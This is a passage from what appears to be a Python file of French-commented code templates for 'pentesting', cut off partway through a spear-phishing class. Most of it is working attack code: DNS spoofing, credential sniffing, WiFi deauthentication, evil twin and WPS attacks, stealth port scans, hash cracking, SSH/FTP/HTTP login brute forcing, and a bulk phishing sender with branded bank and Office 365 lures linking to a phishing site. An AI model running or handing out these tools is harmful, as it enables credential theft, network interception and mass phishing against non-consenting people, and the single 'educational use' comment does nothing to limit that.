    def __init__(self, interface: str, target_domain: str, fake_ip: str):
        self.interface = interface
        self.target_domain = target_domain
        self.fake_ip = fake_ip
        
    def process_packet(self, packet):
        '''Traiter les paquets DNS'''
        if packet.haslayer(DNSQR):
            qname = packet[DNSQR].qname.decode()
            
            if self.target_domain in qname:
                print(f"[*] Spoofing DNS request for {qname}")
                
                # Créer une réponse DNS falsifiée
                spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/\\
                             UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\\
                             DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                                an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=self.fake_ip))
                
                send(spoofed_pkt, verbose=False)
                print(f"[+] Sent spoofed DNS response: {qname} -> {self.fake_ip}")
    
    def start(self):
        '''Démarrer le DNS spoofing'''
        print(f"[*] Starting DNS spoofing: {self.target_domain} -> {self.fake_ip}")
        sniff(iface=self.interface, filter="udp port 53", prn=self.process_packet, store=0)

# ========================================
# PACKET SNIFFING
# ========================================

class PacketSniffer:
    '''Sniffeur de paquets réseau'''
    
    def __init__(self, interface: str):
        self.interface = interface
        self.packets = []
        
    def packet_callback(self, packet):
        '''Callback pour chaque paquet capturé'''
        if packet.haslayer(IP):
            ip_src = packet[IP].src
            ip_dst = packet[IP].dst
            
            protocol = "Other"
            info = ""
            
            if packet.haslayer(TCP):
                protocol = "TCP"
                info = f"{packet[TCP].sport} -> {packet[TCP].dport}"
                
                # Capturer les credentials HTTP
                if packet.haslayer(Raw):
                    load = packet[Raw].load.decode(errors='ignore')
                    if "POST" in load:
                        print(f"\\n[+] HTTP POST Detected: {ip_src} -> {ip_dst}")
                        print(f"    Data: {load[:200]}")
                        
            elif packet.haslayer(UDP):
                protocol = "UDP"
                info = f"{packet[UDP].sport} -> {packet[UDP].dport}"
                
            elif packet.haslayer(ICMP):
                protocol = "ICMP"
                info = f"Type: {packet[ICMP].type}"
            
            packet_info = {
                'timestamp': time.time(),
                'src': ip_src,
                'dst': ip_dst,
                'protocol': protocol,
                'info': info
            }
            
            self.packets.append(packet_info)
            print(f"[*] {protocol}: {ip_src} -> {ip_dst} | {info}")
    
    def sniff_credentials(self):
        '''Sniffer spécialement pour les credentials'''
        def credential_callback(packet):
            if packet.haslayer(Raw):
                load = packet[Raw].load.decode(errors='ignore').lower()
                
                # Rechercher des patterns de credentials
                if any(keyword in load for keyword in ['password', 'user', 'login', 'auth']):
                    print(f"\\n[!] Potential credentials detected:")
                    print(f"    Source: {packet[IP].src}")
                    print(f"    Destination: {packet[IP].dst}")
                    print(f"    Data: {load[:300]}")
        
        print("[*] Sniffing for credentials...")
        sniff(iface=self.interface, prn=credential_callback, store=0)
    
    def start_sniffing(self, count: int = 0, timeout: int = None):
        '''Démarrer le sniffing'''
        print(f"[*] Starting packet capture on {self.interface}")
        sniff(
            iface=self.interface,
            prn=self.packet_callback,
            count=count,
            timeout=timeout,
            store=0
        )
    
    def save_pcap(self, filename: str):
        '''Sauvegarder en fichier PCAP'''
        wrpcap(filename, self.packets)
        print(f"[+] Packets saved to {filename}")

# ========================================
# WIRELESS ATTACKS
# ========================================

class WirelessAttacks:
    '''Attaques WiFi'''
    
    def __init__(self, interface: str):
        self.interface = interface
        self.aps = {}
        
    def enable_monitor_mode(self):
        '''Activer le mode monitor'''
        print(f"[*] Enabling monitor mode on {self.interface}")
        os.system(f"ifconfig {self.interface} down")
        os.system(f"iwconfig {self.interface} mode monitor")
        os.system(f"ifconfig {self.interface} up")
        print("[+] Monitor mode enabled")
    
    def disable_monitor_mode(self):
        '''Désactiver le mode monitor'''
        print(f"[*] Disabling monitor mode on {self.interface}")
        os.system(f"ifconfig {self.interface} down")
        os.system(f"iwconfig {self.interface} mode managed")
        os.system(f"ifconfig {self.interface} up")
        print("[+] Managed mode restored")
    
    def scan_networks(self, timeout: int = 60):
        '''Scanner les réseaux WiFi'''
        print(f"[*] Scanning for WiFi networks (timeout: {timeout}s)")
        
        def packet_handler(packet):
            if packet.haslayer(Dot11Beacon):
                bssid = packet[Dot11].addr2
                ssid = packet[Dot11Elt].info.decode(errors='ignore')
                
                # Extraire les informations
                stats = packet[Dot11Beacon].network_stats()
                channel = int(ord(packet[Dot11Elt:3].info))
                crypto = stats.get('crypto')
                
                if bssid not in self.aps:
                    self.aps[bssid] = {
                        'ssid': ssid,
                        'channel': channel,
                        'crypto': crypto,
                        'signal': packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else 'N/A'
                    }
                    
                    print(f"[+] Found AP: {ssid} | BSSID: {bssid} | Channel: {channel} | Encryption: {crypto}")
        
        sniff(iface=self.interface, prn=packet_handler, timeout=timeout)
        return self.aps
    
    def deauth_attack(self, target_mac: str, ap_mac: str, count: int = 10):
        '''Attaque de déauthentification'''
        print(f"[*] Sending deauth packets to {target_mac}")
        
        # Créer un paquet de déauth
        dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
        deauth = Dot11Deauth(reason=7)
        frame = RadioTap()/dot11/deauth
        
        # Envoyer les paquets
        sendp(frame, iface=self.interface, count=count, inter=0.1, verbose=False)
        print(f"[+] Sent {count} deauth packets")
    
    def capture_handshake(self, target_bssid: str, output_file: str, timeout: int = 300):
        '''Capturer un handshake WPA'''
        print(f"[*] Capturing WPA handshake for {target_bssid}")
        print(f"[*] Timeout: {timeout} seconds")
        
        handshake_captured = False
        
        def packet_handler(packet):
            nonlocal handshake_captured
            
            if packet.haslayer(EAPOL):
                # Handshake detecté!
                if packet[Dot11].addr3 == target_bssid:
                    print(f"\\n[!] WPA Handshake captured for {target_bssid}!")
                    handshake_captured = True
                    return True
        
        # Capturer les paquets
        packets = sniff(
            iface=self.interface,
            stop_filter=packet_handler,
            timeout=timeout
        )
        
        if handshake_captured:
            wrpcap(output_file, packets)
            print(f"[+] Handshake saved to {output_file}")
        else:
            print("[!] No handshake captured")
        
        return handshake_captured
    
    def evil_twin_attack(self, target_ssid: str, target_channel: int):
        '''Créer un Evil Twin (AP Rogue)'''
        print(f"[*] Creating Evil Twin: {target_ssid}")
        
        # Configuration de l'AP rogue avec hostapd
        hostapd_conf = f\"\"\"
interface={self.interface}
driver=nl80211
ssid={target_ssid}
hw_mode=g
channel={target_channel}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
\"\"\"
        
        with open('/tmp/hostapd.conf', 'w') as f:
            f.write(hostapd_conf)
        
        print("[*] Starting hostapd...")
        os.system("hostapd /tmp/hostapd.conf")
    
    def wps_attack(self, target_bssid: str):
        '''Attaque WPS (Pixie Dust / Brute Force)'''
        print(f"[*] Attempting WPS attack on {target_bssid}")
        
        # Utiliser reaver pour l'attaque WPS
        command = f"reaver -i {self.interface} -b {target_bssid} -vv -K"
        os.system(command)

# ========================================
# PORT SCANNING AVANCÉ
# ========================================

class AdvancedPortScanner:
    '''Scanner de ports avancé avec Scapy'''
    
    def __init__(self, target: str):
        self.target = target
        
    def tcp_syn_scan(self, ports: List[int]) -> Dict[int, str]:
        '''SYN scan (stealth)'''
        print(f"[*] TCP SYN scan on {self.target}")
        results = {}
        
        for port in ports:
            # Envoyer un paquet SYN
            syn_packet = IP(dst=self.target)/TCP(dport=port, flags='S')
            response = sr1(syn_packet, timeout=1, verbose=False)
            
            if response:
                if response.haslayer(TCP):
                    if response[TCP].flags == 0x12:  # SYN-ACK
                        # Port ouvert, envoyer RST
                        rst_packet = IP(dst=self.target)/TCP(dport=port, flags='R')
                        send(rst_packet, verbose=False)
                        results[port] = 'open'
                        print(f"[+] Port {port}: OPEN")
                    elif response[TCP].flags == 0x14:  # RST-ACK
                        results[port] = 'closed'
            else:
                results[port] = 'filtered'
        
        return results
    
    def tcp_connect_scan(self, ports: List[int]) -> Dict[int, str]:
        '''Connect scan (complet)'''
        print(f"[*] TCP Connect scan on {self.target}")
        results = {}
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.target, port))
                
                if result == 0:
                    results[port] = 'open'
                    print(f"[+] Port {port}: OPEN")
                else:
                    results[port] = 'closed'
                
                sock.close()
            except:
                results[port] = 'filtered'
        
        return results
    
    def udp_scan(self, ports: List[int]) -> Dict[int, str]:
        '''Scan UDP'''
        print(f"[*] UDP scan on {self.target}")
        results = {}
        
        for port in ports:
            udp_packet = IP(dst=self.target)/UDP(dport=port)
            response = sr1(udp_packet, timeout=2, verbose=False)
            
            if response is None:
                results[port] = 'open|filtered'
            elif response.haslayer(ICMP):
                if int(response[ICMP].type) == 3 and int(response[ICMP].code) == 3:
                    results[port] = 'closed'
            else:
                results[port] = 'open'
                print(f"[+] Port {port}: OPEN")
        
        return results
    
    def xmas_scan(self, ports: List[int]) -> Dict[int, str]:
        '''XMAS scan (FIN, PSH, URG)'''
        print(f"[*] XMAS scan on {self.target}")
        results = {}
        
        for port in ports:
            xmas_packet = IP(dst=self.target)/TCP(dport=port, flags='FPU')
            response = sr1(xmas_packet, timeout=1, verbose=False)
            
            if response is None:
                results[port] = 'open|filtered'
            elif response.haslayer(TCP):
                if response[TCP].flags == 0x14:  # RST-ACK
                    results[port] = 'closed'
            elif response.haslayer(ICMP):
                results[port] = 'filtered'
        
        return results
    
    def fin_scan(self, ports: List[int]) -> Dict[int, str]:
        '''FIN scan'''
        print(f"[*] FIN scan on {self.target}")
        results = {}
        
        for port in ports:
            fin_packet = IP(dst=self.target)/TCP(dport=port, flags='F')
            response = sr1(fin_packet, timeout=1, verbose=False)
            
            if response is None:
                results[port] = 'open|filtered'
                print(f"[+] Port {port}: OPEN|FILTERED")
            elif response.haslayer(TCP):
                if response[TCP].flags == 0x14:
                    results[port] = 'closed'
        
        return results
    
    def null_scan(self, ports: List[int]) -> Dict[int, str]:
        '''NULL scan (aucun flag)'''
        print(f"[*] NULL scan on {self.target}")
        results = {}
        
        for port in ports:
            null_packet = IP(dst=self.target)/TCP(dport=port, flags='')
            response = sr1(null_packet, timeout=1, verbose=False)
            
            if response is None:
                results[port] = 'open|filtered'
            elif response.haslayer(TCP):
                if response[TCP].flags == 0x14:
                    results[port] = 'closed'
        
        return results

# ========================================
# SCRIPT D'EXÉCUTION
# ========================================

def network_pentest_suite(target_ip: str, gateway_ip: str, interface: str):
    '''Suite complète de pentest réseau'''
    print(f"\\n{'='*60}")
    print(f"NETWORK PENETRATION TESTING SUITE")
    print(f"{'='*60}\\n")
    
    # 1. Port Scanning
    print("\\n[*] PHASE 1: PORT SCANNING")
    scanner = AdvancedPortScanner(target_ip)
    common_ports = [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 8080]
    open_ports = scanner.tcp_syn_scan(common_ports)
    
    # 2. Packet Sniffing
    print("\\n[*] PHASE 2: PACKET SNIFFING (30 seconds)")
    sniffer = PacketSniffer(interface)
    threading.Thread(
        target=sniffer.start_sniffing,
        kwargs={'timeout': 30}
    ).start()
    
    # 3. ARP Spoofing (optionnel - décommenter avec précaution)
    # print("\\n[*] PHASE 3: ARP SPOOFING")
    # arp_spoof = ARPSpoofing(interface)
    # arp_spoof.mitm_attack(target_ip, gateway_ip, duration=60)
    
    report = {
        'target': target_ip,
        'timestamp': time.time(),
        'open_ports': open_ports,
        'packets_captured': len(sniffer.packets)
    }
    
    print(f"\\n[+] Pentest complete!")
    return report

if __name__ == "__main__":
    # ATTENTION: Ces scripts sont à usage éducatif uniquement
    # N'utilisez que sur des réseaux dont vous avez l'autorisation
    
    target = "192.168.1.100"
    gateway = "192.168.1.1"
    iface = "eth0"
    
    report = network_pentest_suite(target, gateway, iface)
"""
    },

    # ========================================
    # PENTESTING - PASSWORD ATTACKS
    # ========================================
    
    "pentest_password_attacks": {
        "patterns": ["password cracking", "hash cracking", "brute force", "dictionary attack", "john the ripper", "hashcat"],
        "template": """
# ========================================
# PENTESTING - PASSWORD ATTACKS
# ========================================

import hashlib
import itertools
import string
import subprocess
from typing import List, Dict, Optional, Generator
import multiprocessing as mp
from functools import partial

# ========================================
# HASH CRACKING
# ========================================

class HashCracker:
    '''Craquage de hash avec différentes méthodes'''
    
    HASH_TYPES = {
        'md5': hashlib.md5,
        'sha1': hashlib.sha1,
        'sha256': hashlib.sha256,
        'sha512': hashlib.sha512
    }
    
    def __init__(self, hash_type: str = 'md5'):
        if hash_type not in self.HASH_TYPES:
            raise ValueError(f"Unsupported hash type: {hash_type}")
        self.hash_type = hash_type
        self.hash_func = self.HASH_TYPES[hash_type]
    
    def compute_hash(self, text: str) -> str:
        '''Calculer le hash d'un texte'''
        return self.hash_func(text.encode()).hexdigest()
    
    def dictionary_attack(self, target_hash: str, wordlist_path: str) -> Optional[str]:
        '''Attaque par dictionnaire'''
        print(f"[*] Starting dictionary attack with {wordlist_path}")
        
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                for i, word in enumerate(f):
                    word = word.strip()
                    computed_hash = self.compute_hash(word)
                    
                    if computed_hash == target_hash:
                        print(f"[+] Password found: {word}")
                        return word
                    
                    if i % 10000 == 0:
                        print(f"[*] Tested {i} passwords...")
        
        except FileNotFoundError:
            print(f"[!] Wordlist not found: {wordlist_path}")
        
        print("[!] Password not found")
        return None
    
    def brute_force_attack(self, target_hash: str, max_length: int = 4,
                          charset: str = string.ascii_lowercase + string.digits) -> Optional[str]:
        '''Attaque par force brute'''
        print(f"[*] Starting brute force attack (max length: {max_length})")
        
        for length in range(1, max_length + 1):
            print(f"[*] Trying length {length}...")
            
            for attempt in itertools.product(charset, repeat=length):
                password = ''.join(attempt)
                computed_hash = self.compute_hash(password)
                
                if computed_hash == target_hash:
                    print(f"[+] Password found: {password}")
                    return password
        
        print("[!] Password not found")
        return None
    
    def hybrid_attack(self, target_hash: str, wordlist_path: str,
                     mutations: List[str] = None) -> Optional[str]:
        '''Attaque hybride (dictionnaire + mutations)'''
        print(f"[*] Starting hybrid attack")
        
        if mutations is None:
            mutations = ['', '123', '!', '1', '2023', '@']
        
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                for word in f:
                    word = word.strip()
                    
                    # Tester le mot de base
                    computed_hash = self.compute_hash(word)
                    if computed_hash == target_hash:
                        print(f"[+] Password found: {word}")
                        return word
                    
                    # Tester avec mutations
                    for mutation in mutations:
                        candidates = [
                            word + mutation,
                            mutation + word,
                            word.capitalize() + mutation,
                            word.upper() + mutation
                        ]
                        
                        for candidate in candidates:
                            computed_hash = self.compute_hash(candidate)
                            if computed_hash == target_hash:
                                print(f"[+] Password found: {candidate}")
                                return candidate
        
        except FileNotFoundError:
            print(f"[!] Wordlist not found: {wordlist_path}")
        
        print("[!] Password not found")
        return None
    
    def crack_multiple_hashes(self, hash_list: List[str], wordlist_path: str) -> Dict[str, Optional[str]]:
        '''Craquer plusieurs hashs en parallèle'''
        print(f"[*] Cracking {len(hash_list)} hashes...")
        
        results = {}
        
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                for i, word in enumerate(f):
                    word = word.strip()
                    computed_hash = self.compute_hash(word)
                    
                    for target_hash in hash_list:
                        if target_hash in results:
                            continue
                        
                        if computed_hash == target_hash:
                            results[target_hash] = word
                            print(f"[+] Found password for {target_hash[:16]}...: {word}")
                    
                    if len(results) == len(hash_list):
                        break
                    
                    if i % 10000 == 0:
                        print(f"[*] Progress: {len(results)}/{len(hash_list)} found")
        
        except FileNotFoundError:
            print(f"[!] Wordlist not found: {wordlist_path}")
        
        return results

# ========================================
# RAINBOW TABLES
# ========================================

class RainbowTable:
    '''Génération et utilisation de rainbow tables'''
    
    def __init__(self, hash_type: str = 'md5'):
        self.hash_type = hash_type
        self.hash_func = HashCracker.HASH_TYPES[hash_type]
        self.table = {}
    
    def generate_table(self, wordlist_path: str, output_path: str = None):
        '''Générer une rainbow table'''
        print(f"[*] Generating rainbow table from {wordlist_path}")
        
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                for i, word in enumerate(f):
                    word = word.strip()
                    hash_value = self.hash_func(word.encode()).hexdigest()
                    self.table[hash_value] = word
                    
                    if i % 10000 == 0:
                        print(f"[*] Processed {i} words...")
            
            print(f"[+] Rainbow table generated: {len(self.table)} entries")
            
            if output_path:
                self.save_table(output_path)
        
        except FileNotFoundError:
            print(f"[!] Wordlist not found: {wordlist_path}")
    
    def save_table(self, filepath: str):
        '''Sauvegarder la table'''
        with open(filepath, 'w') as f:
            for hash_val, password in self.table.items():
                f.write(f"{hash_val}:{password}\\n")
        print(f"[+] Rainbow table saved to {filepath}")
    
    def load_table(self, filepath: str):
        '''Charger une table existante'''
        print(f"[*] Loading rainbow table from {filepath}")
        
        with open(filepath, 'r') as f:
            for line in f:
                hash_val, password = line.strip().split(':', 1)
                self.table[hash_val] = password
        
        print(f"[+] Loaded {len(self.table)} entries")
    
    def crack_hash(self, target_hash: str) -> Optional[str]:
        '''Craquer un hash avec la table'''
        return self.table.get(target_hash)

# ========================================
# ONLINE PASSWORD ATTACKS
# ========================================

class OnlinePasswordAttack:
    '''Attaques de mots de passe en ligne'''
    
    def __init__(self, target_url: str, username_field: str, password_field: str):
        self.target_url = target_url
        self.username_field = username_field
        self.password_field = password_field
    
    def http_brute_force(self, username: str, wordlist_path: str,
                        success_indicator: str = None, delay: float = 0.5) -> Optional[str]:
        '''Brute force HTTP'''
        import requests
        import time
        
        print(f"[*] Starting HTTP brute force on {self.target_url}")
        print(f"[*] Username: {username}")
        
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                for i, password in enumerate(f):
                    password = password.strip()
                    
                    data = {
                        self.username_field: username,
                        self.password_field: password
                    }
                    
                    try:
                        response = requests.post(self.target_url, data=data, timeout=5)
                        
                        # Vérifier le succès
                        if success_indicator:
                            if success_indicator in response.text:
                                print(f"[+] Password found: {password}")
                                return password
                        else:
                            if response.status_code == 200 and "error" not in response.text.lower():
                                print(f"[+] Password found: {password}")
                                return password
                        
                        if i % 10 == 0:
                            print(f"[*] Tested {i} passwords...")
                        
                        time.sleep(delay)
                    
                    except requests.exceptions.RequestException as e:
                        print(f"[!] Request error: {e}")
                        continue
        
        except FileNotFoundError:
            print(f"[!] Wordlist not found: {wordlist_path}")
        
        print("[!] Password not found")
        return None
    
    def ssh_brute_force(self, host: str, username: str, wordlist_path: str,
                       port: int = 22) -> Optional[str]:
        '''Brute force SSH'''
        import paramiko
        
        print(f"[*] Starting SSH brute force on {host}:{port}")
        print(f"[*] Username: {username}")
        
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                for i, password in enumerate(f):
                    password = password.strip()
                    
                    try:
                        client.connect(
                            host,
                            port=port,
                            username=username,
                            password=password,
                            timeout=3
                        )
                        
                        print(f"[+] Password found: {password}")
                        client.close()
                        return password
                    
                    except paramiko.AuthenticationException:
                        if i % 10 == 0:
                            print(f"[*] Tested {i} passwords...")
                        continue
                    except Exception as e:
                        print(f"[!] Connection error: {e}")
                        break
        
        except FileNotFoundError:
            print(f"[!] Wordlist not found: {wordlist_path}")
        
        print("[!] Password not found")
        return None
    
    def ftp_brute_force(self, host: str, username: str, wordlist_path: str,
                       port: int = 21) -> Optional[str]:
        '''Brute force FTP'''
        import ftplib
        
        print(f"[*] Starting FTP brute force on {host}:{port}")
        
        try:
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                for i, password in enumerate(f):
                    password = password.strip()
                    
                    try:
                        ftp = ftplib.FTP()
                        ftp.connect(host, port, timeout=5)
                        ftp.login(username, password)
                        
                        print(f"[+] Password found: {password}")
                        ftp.quit()
                        return password
                    
                    except ftplib.error_perm:
                        if i % 10 == 0:
                            print(f"[*] Tested {i} passwords...")
                        continue
                    except Exception as e:
                        print(f"[!] Connection error: {e}")
                        break
        
        except FileNotFoundError:
            print(f"[!] Wordlist not found: {wordlist_path}")
        
        print("[!] Password not found")
        return None

# ========================================
# HASHCAT / JOHN THE RIPPER WRAPPER
# ========================================

class PasswordCrackingTools:
    '''Wrapper pour Hashcat et John the Ripper'''
    
    @staticmethod
    def hashcat_crack(hash_file: str, wordlist: str, hash_type: int = 0,
                     attack_mode: int = 0, rules: str = None) -> str:
        '''Utiliser Hashcat'''
        cmd = [
            'hashcat',
            '-m', str(hash_type),  # Type de hash (0=MD5, 1000=NTLM, etc.)
            '-a', str(attack_mode),  # Mode d'attaque (0=straight, 3=brute-force)
            hash_file,
            wordlist
        ]
        
        if rules:
            cmd.extend(['-r', rules])
        
        cmd.append('--force')
        
        print(f"[*] Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        return result.stdout
    
    @staticmethod
    def john_crack(hash_file: str, wordlist: str = None, format: str = None) -> str:
        '''Utiliser John the Ripper'''
        cmd = ['john']
        
        if wordlist:
            cmd.extend(['--wordlist=' + wordlist])
        
        if format:
            cmd.extend(['--format=' + format])
        
        cmd.append(hash_file)
        
        print(f"[*] Running: {' '.join(cmd)}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        return result.stdout
    
    @staticmethod
    def john_show_cracked(hash_file: str) -> str:
        '''Afficher les mots de passe craqués'''
        cmd = ['john', '--show', hash_file]
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout
    
    @staticmethod
    def hashcat_masks() -> Dict[str, str]:
        '''Retourner des masques Hashcat courants'''
        return {
            '8_lowercase': '?l?l?l?l?l?l?l?l',
            '8_mixed': '?u?l?l?l?l?l?d?d',
            'common_pattern': '?u?l?l?l?l?d?d?s',
            'year_suffix': '?l?l?l?l?l?d?d?d?d',
            'special_suffix': '?l?l?l?l?l?l?s?s'
        }

# ========================================
# WORDLIST GENERATION
# ========================================

class WordlistGenerator:
    '''Génération de wordlists personnalisées'''
    
    @staticmethod
    def generate_common_patterns(base_words: List[str], output_path: str):
        '''Générer des patterns courants'''
        patterns = []
        
        for word in base_words:
            # Mot de base
            patterns.append(word)
            patterns.append(word.capitalize())
            patterns.append(word.upper())
            
            # Avec chiffres
            for year in range(2020, 2025):
                patterns.append(f"{word}{year}")
                patterns.append(f"{word}{year % 100}")
            
            for num in range(100):
                patterns.append(f"{word}{num}")
            
            # Avec caractères spéciaux
            for special in ['!', '@', '#', '$', '123']:
                patterns.append(f"{word}{special}")
                patterns.append(f"{special}{word}")
        
        # Écrire dans le fichier
        with open(output_path, 'w') as f:
            for pattern in sorted(set(patterns)):
                f.write(pattern + '\\n')
        
        print(f"[+] Generated {len(set(patterns))} passwords in {output_path}")
    
    @staticmethod
    def leetspeak_generator(word: str) -> List[str]:
        '''Générer des variations leetspeak'''
        leet_map = {
            'a': ['a', '4', '@'],
            'e': ['e', '3'],
            'i': ['i', '1', '!'],
            'o': ['o', '0'],
            's': ['s', '5', '$'],
            't': ['t', '7'],
            'l': ['l', '1']
        }
        
        variations = [word]
        
        for char, replacements in leet_map.items():
            new_variations = []
            for variation in variations:
                for replacement in replacements:
                    new_variations.append(variation.replace(char, replacement))
            variations = new_variations
        
        return list(set(variations))

# ========================================
# SCRIPT D'EXÉCUTION
# ========================================

def password_cracking_suite(target_hash: str, wordlist: str, hash_type: str = 'md5'):
    '''Suite complète de craquage de mots de passe'''
    print(f"\\n{'='*60}")
    print(f"PASSWORD CRACKING SUITE")
    print(f"{'='*60}\\n")
    
    # 1. Dictionary Attack
    print("[*] PHASE 1: DICTIONARY ATTACK")
    cracker = HashCracker(hash_type)
    password = cracker.dictionary_attack(target_hash, wordlist)
    
    if password:
        return password
    
    # 2. Hybrid Attack
    print("\\n[*] PHASE 2: HYBRID ATTACK")
    password = cracker.hybrid_attack(target_hash, wordlist)
    
    if password:
        return password
    
    # 3. Brute Force (si pas trouvé)
    print("\\n[*] PHASE 3: BRUTE FORCE ATTACK")
    password = cracker.brute_force_attack(target_hash, max_length=6)
    
    return password

if __name__ == "__main__":
    # Exemple de hash MD5 à craquer
    target = "5f4dcc3b5aa765d61d8327deb882cf99"  # "password"
    wordlist = "/usr/share/wordlists/rockyou.txt"
    
    result = password_cracking_suite(target, wordlist)
    print(f"\\nFinal result: {result}")
"""
    },

    # ========================================
    # PENTESTING - SOCIAL ENGINEERING
    # ========================================
    
    "pentest_social_engineering": {
        "patterns": ["social engineering", "phishing", "spear phishing", "pretexting", "vishing", "email spoofing"],
        "template": """
# ========================================
# PENTESTING - SOCIAL ENGINEERING
# ========================================

import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import dns.resolver
from typing import List, Dict
import requests
from bs4 import BeautifulSoup
import qrcode
from io import BytesIO
import base64

# ========================================
# PHISHING CAMPAIGNS
# ========================================

class PhishingFramework:
    '''Framework pour créer des campagnes de phishing'''
    
    def __init__(self, smtp_server: str, smtp_port: int, sender_email: str, sender_password: str):
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.sender_email = sender_email
        self.sender_password = sender_password
    
    def create_phishing_email(self, target_email: str, subject: str,
                             template_type: str = 'generic') -> MIMEMultipart:
        '''Créer un email de phishing'''
        msg = MIMEMultipart('alternative')
        msg['From'] = self.sender_email
        msg['To'] = target_email
        msg['Subject'] = subject
        
        templates = {
            'generic': self._generic_template(),
            'office365': self._office365_template(),
            'banking': self._banking_template(),
            'shipping': self._shipping_template(),
            'password_reset': self._password_reset_template()
        }
        
        html_content = templates.get(template_type, templates['generic'])
        html_part = MIMEText(html_content, 'html')
        msg.attach(html_part)
        
        return msg
    
    def _generic_template(self) -> str:
        '''Template générique'''
        return (
            '<html>'
            '  <body style="font-family: Arial, sans-serif;">'
            '    <h2>Important Security Alert</h2>'
            '    <p>We\'ve detected unusual activity on your account.</p>'
            '    <p>Please verify your account immediately:</p>'
            '    <a href="http://tracking-link.com/verify" '
            '       style="background-color: #4CAF50; color: white; padding: 14px 20px; '
            '              text-decoration: none; display: inline-block;">'
            '      Verify Account'
            '    </a>'
            '    <p><small>This link expires in 24 hours.</small></p>'
            '  </body>'
            '</html>'
        )
    
    def _office365_template(self) -> str:
        '''Template Office 365'''
        return (
            '<html>'
            '  <body style="font-family: Segoe UI, sans-serif;">'
            '    <div style="background-color: #0078d4; padding: 20px;">'
            '      <h2 style="color: white;">Microsoft Office 365</h2>'
            '    </div>'
            '    <div style="padding: 20px;">'
            '      <h3>Your mailbox is almost full</h3>'
            '      <p>Your mailbox has exceeded 95% of its storage capacity.</p>'
            '      <p>Click below to increase your storage:</p>'
            '      <a href="http://phishing-site.com/office365" '
            '         style="background-color: #0078d4; color: white; padding: 10px 20px; '
            '                text-decoration: none; display: inline-block;">'
            '        Increase Storage'
            '      </a>'
            '    </div>'
            '  </body>'
            '</html>'
        )
    
    def _banking_template(self) -> str:
        '''Template bancaire'''
        return (
            '<html>'
            '  <body style="font-family: Arial, sans-serif;">'
            '    <h2>Security Alert - Action Required</h2>'
            '    <p>Dear Valued Customer,</p>'
            '    <p>We have detected suspicious activity on your account.</p>'
            '    <p>For your security, we have temporarily limited your account access.</p>'
            '    <p>Please confirm your identity:</p>'
            '    <a href="http://phishing-site.com/bank" '
            '       style="background-color: #d32f2f; color: white; padding: 12px 24px; '
            '              text-decoration: none; display: inline-block;">'
            '      Confirm Identity'
            '    </a>'
            '    <p><strong>This must be completed within 24 hours.</strong></p>'
            '  </body>'
            '</html>'
        )
    
    def _shipping_template(self) -> str:
        '''Template de livraison'''
        return (
            '<html>'
            '  <body style="font-family: Arial, sans-serif;">'
            '    <h2>Package Delivery Notification</h2>'
            '    <p>We attempted to deliver your package but no one was available.</p>'
            '    <p>Tracking Number: #DHL-2024-789456</p>'
            '    <p>Schedule a redelivery or pick up at your nearest location:</p>'
            '    <a href="http://phishing-site.com/delivery" '
            '       style="background-color: #ffcc00; color: black; padding: 12px 24px; '
            '              text-decoration: none; display: inline-block;">'
            '      Schedule Redelivery'
            '    </a>'
            '  </body>'
            '</html>'
        )
    
    def _password_reset_template(self) -> str:
        '''Template de réinitialisation'''
        return (
            '<html>'
            '  <body style="font-family: Arial, sans-serif;">'
            '    <h2>Password Reset Request</h2>'
            '    <p>We received a request to reset your password.</p>'
            '    <p>If you made this request, click the button below:</p>'
            '    <a href="http://phishing-site.com/reset" '
            '       style="background-color: #2196F3; color: white; padding: 12px 24px; '
            '              text-decoration: none; display: inline-block;">'
            '      Reset Password'
            '    </a>'
            '    <p>If you didn\'t request this, please ignore this email.</p>'
            '    <p><small>This link expires in 1 hour.</small></p>'
            '  </body>'
            '</html>'
        )
    
    def send_phishing_email(self, msg: MIMEMultipart) -> bool:
        '''Envoyer un email de phishing'''
        try:
            with smtplib.SMTP(self.smtp_server, self.smtp_port) as server:
                server.starttls()
                server.login(self.sender_email, self.sender_password)
                server.send_message(msg)
            
            print(f"[+] Email sent to {msg['To']}")
            return True
        
        except Exception as e:
            print(f"[!] Failed to send email: {e}")
            return False
    
    def send_campaign(self, targets: List[str], subject: str, template_type: str = 'generic'):
        '''Lancer une campagne de phishing'''
        print(f"[*] Starting phishing campaign")
        print(f"[*] Targets: {len(targets)}")
        
        results = {'success': 0, 'failed': 0}
        
        for target in targets:
            msg = self.create_phishing_email(target, subject, template_type)
            
            if self.send_phishing_email(msg):
                results['success'] += 1
            else:
                results['failed'] += 1
        
        print(f"\\n[+] Campaign complete:")
        print(f"    Success: {results['success']}")
        print(f"    Failed: {results['failed']}")
        
        return results

# ========================================
# SPEAR PHISHING
# ========================================

class SpearPhishing:
    '''Phishing ciblé avec informations personnalisées'''
    
    @staticmethod
    def gather_osint(target_name: str, company: str) -> Dict:
        '''Collecter des informations OSINT'''
        info = {
            'name': target_name,
            'company': company,
            'linkedin': None,
